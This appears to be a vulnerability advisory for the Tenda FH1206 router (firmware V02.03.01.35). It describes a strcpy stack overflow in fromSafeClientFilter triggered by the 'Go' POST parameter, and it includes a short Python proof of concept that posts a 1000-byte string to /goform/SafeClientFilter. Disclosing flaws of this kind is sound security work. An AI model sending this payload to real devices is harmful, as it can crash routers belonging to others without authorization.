## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2905.html

## Affected version

FH1206 V02.03.01.35

## Vulnerability details

The Tenda FH1206 V02.03.01.35 has a stack overflow vulnerability located in the `fromSafeClientFilter` function. This function accepts the `Go` parameter from a POST request. The statement `strcpy(v15, v1);` leads to a buffer overflow. The user-supplied `Go` can exceed the capacity of the `v15` array, thus triggering this security vulnerability.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/屏幕截图 2024-08-02 154934.png)

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/屏幕截图 2024-08-02 154855.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SafeClientFilter"
payload = b"a"*1000

data = {"Go": payload, "menufacturer": "tenda"}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240801202321673](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801202321673.png)